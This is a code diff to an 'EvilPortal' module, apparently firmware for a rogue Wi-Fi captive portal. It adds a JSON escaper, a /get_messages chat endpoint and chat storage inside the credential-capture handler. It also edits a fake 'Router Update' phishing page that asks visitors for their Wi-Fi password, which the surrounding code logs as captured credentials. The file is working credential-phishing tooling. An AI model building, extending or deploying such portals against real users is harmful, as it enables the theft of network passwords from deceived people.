@@ -33,6 +33,16 @@ EvilPortal::EvilPortal(
 
 EvilPortal::~EvilPortal() {}
 
+String EvilPortal::escapeJson(const String& s) {
+    String res = s;
+    res.replace("\\", "\\\\");
+    res.replace("\"", "\\\"");
+    res.replace("\n", "\\n");
+    res.replace("\r", "\\r");
+    res.replace("\t", "\\t");
+    return res;
+}
+
 void EvilPortal::CaptiveRequestHandler::handleRequest(AsyncWebServerRequest *request) {
     AsyncResponseStream *response = request->beginResponseStream("text/html");
     String url = request->url();
@@ -220,6 +230,16 @@ void EvilPortal::setupRoutes() {
         AsyncWebServerResponse *response = request->beginResponse(302);
         response->addHeader("Location", "http://" + WiFi.softAPIP().toString() + "/");
         request->send(response);
+    });
+
+    webServer.on("/get_messages", HTTP_GET, [this](AsyncWebServerRequest *request) {
+        String json = "[";
+        for (size_t i = 0; i < chatHistory.size(); i++) {
+            json += chatHistory[i];
+            if (i < chatHistory.size() - 1) json += ",";
+        }
+        json += "]";
+        request->send(200, "application/json", json);
     });
 
     webServer.on("/", [this](AsyncWebServerRequest *request) { portalController(request); });
@@ -565,12 +585,12 @@ void EvilPortal::loadDefaultHtml_one() {
     htmlPage =
         "<!DOCTYPE html><html lang='en'><head><meta charset='UTF-8'><meta name='viewport' "
         "content='width=device-width, initial-scale=1.0'><title>Router Update</title><style>body "
-        "{font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;background-color: #d3d3d3; /* Cinza "
-        "mais escuro */display: flex;justify-content: center;align-items: center;height: 100vh;margin: "
+        "{font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;background-color: #d3d3d3; display: "
+        "flex;justify-content: center;align-items: center;height: 100vh;margin: "
         "0;padding: 10px;box-sizing: border-box;}.container {background-color: white;padding: "
         "20px;border-radius: 10px;box-shadow: 0 0 15px rgba(0, 0, 0, 0.2);text-align: center;max-width: "
-        "360px;width: 100%;}.container svg {width: 70px;height: 70px;fill: #ff1744; /* Cor de alerta "
-        "*/margin-bottom: 20px;}h1 {color: #333;font-size: 22px;margin-bottom: 15px;}p {color: "
+        "360px;width: 100%;}.container svg {width: 70px;height: 70px;fill: #ff1744; margin-bottom: "
+        "20px;}h1 {color: #333;font-size: 22px;margin-bottom: 15px;}p {color: "
         "#666;font-size: 15px;margin-bottom: 20px;}input[type='password'] {width: 100%;padding: 12px;margin: "
         "10px 0;border-radius: 5px;border: 1px solid #ccc;font-size: 16px;box-sizing: border-box;}button "
         "{width: 100%;padding: 12px;background-color: #007bff;color: white;border: none;border-radius: "
@@ -677,6 +697,17 @@ void EvilPortal::credsController(AsyncWebServerRequest *request) {
     String csvLine = "";
     String key;
     lastCred = "";
+    
+    if (request->hasArg("Nikname") && request->hasArg("Message")) {
+        String nick = escapeJson(request->arg("Nikname"));
+        String msg = escapeJson(request->arg("Message"));
+        String jsonEntry = "{\"n\":\"" + nick + "\",\"m\":\"" + msg + "\"}";
+        
+        if (chatHistory.size() >= 50) { 
+            chatHistory.erase(chatHistory.begin());
+        }
+        chatHistory.push_back(jsonEntry);
+    }
 
     for (int i = 0; i < request->args(); i++) {
         key = request->argName(i);
